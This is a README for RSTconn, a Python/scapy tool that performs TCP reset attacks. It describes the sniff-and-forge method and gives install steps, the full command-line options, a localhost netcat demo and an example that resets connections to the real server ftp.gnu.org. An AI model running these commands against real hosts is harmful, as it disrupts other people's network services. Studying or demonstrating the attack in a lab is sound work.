RSTconn
-------

A TCPKill is a utility that implements a **TCP reset attack**.
RSTconn works for both IPv4 and IPv6 and is written in python and scapy.

How RSTconn works
-------------

RESET is a flag in TCP packets to indicate that the connection is not longer working.
If any of the two participants in a TCP connection send a packet
contains such a RESET flag, the connection will be closed immediately.

Thus it can be use to attack TCP connections once the attacker can forge
TCP packets from any of the two parties if he or she know their IPs, ports
and the sequence number of current TCP connection.

The attack can be used to make certain users to fail to use certain
network services based on TCP if we know the information above.

In practice, we should eavesdrop the victims’ communications to get
their IPs, ports and the sequence number.

We do it by filtering the TCP packets and find the newest packets that we want to attack.


Setup
-----

````
pip install rstconn
````

Usage
-----

````
rstconn kills network connections.

optional arguments:
  -h, --help            show this help message and exit
  --iface {lo,enp0s25,lxcbr0,docker0,br-d316e57def52,vethd4f41f0,veth6fa5336, ...}, -i {...}
                        Interface where to listen to
  --server-ip SERVER_IP, -sip SERVER_IP
                        IPv4 or hostname
  --client-ip CLIENT_IP, -cip CLIENT_IP
                        IPv4 or hostname
  --server-port SERVER_PORT, -p SERVER_PORT
                        Server port
  --packet-count PACKET_COUNT, -pc PACKET_COUNT
                        sends N RST packets
  --seq-jitter SEQ_JITTER, -sj SEQ_JITTER
                        Set seq_jitter to be non-zero in order to prove to yourself that the
                        sequence number of a RST segment does indeed need to be exactly equal
                        to the last sequence number ACK-ed by the receiver
  --ignore-syn, -is     if a Packet has SYN flag, not sending RST
  --window-size WINDOW_SIZE, -ws WINDOW_SIZE
                        Window size
  -d {CRITICAL,ERROR,WARNING,INFO,DEBUG}, --debug {CRITICAL,ERROR,WARNING,INFO,DEBUG}
                        Debug level, see python logging; defaults to INFO if omitted
  -m, --monitor         Just sniff traffic without sendin RST
  -v, --version         Print version and exit

````

RSTconn listens for the matching connections and than sends a
number of SYN/ACK and RST packets to the client to get the connection be killed.

The number of packets is configurable by `--packet-count`, `--iface` and
`--server-ip` and `--server-port` are related to the local server port to be listen on.

````
rstconn -i lo --server-ip 127.0.0.1 --server-port 8000 --packet-count 50
````

Demo
----

````
apt install netcat
````

- Setup TCP connection. In one terminal window run `nc -nvl 8000` to set up a server
- In another terminal window run `nc 127.0.0.1 8000` to connect to the server
- In a third window run `rstconn` to run our sniffing program

You should see the sniffing program log some output, send a RST packet, and the nc connection should be broken.

If you want to test rstconn in IPv6, use instead:

- `nc ::1 8000`
- `nc -nvl ::1 8000`
- `rstconn -i lo --server-ip "::1" --server-port 8000 -pc 33`

Usage examples
--------------

Reset connections to ftp.gnu.org
````
rstconn -i enp0s25 --server-ip ftp.gnu.org
````

on the client side we'll see
````
ftp> ls
421 Service not available, remote server has closed connection
````

without server/client ip, using only the port

````
rstconn -i lo --server-port 8000
````

Credits
-------

- https://gist.github.com/spinpx/263a2ed86f974a55d35cf6c3a2541dc2
- https://github.com/robert/how-does-a-tcp-reset-attack-work


References
----------

- Watson, P.: Slipping in the Window: TCP Reset attacks. (2004)
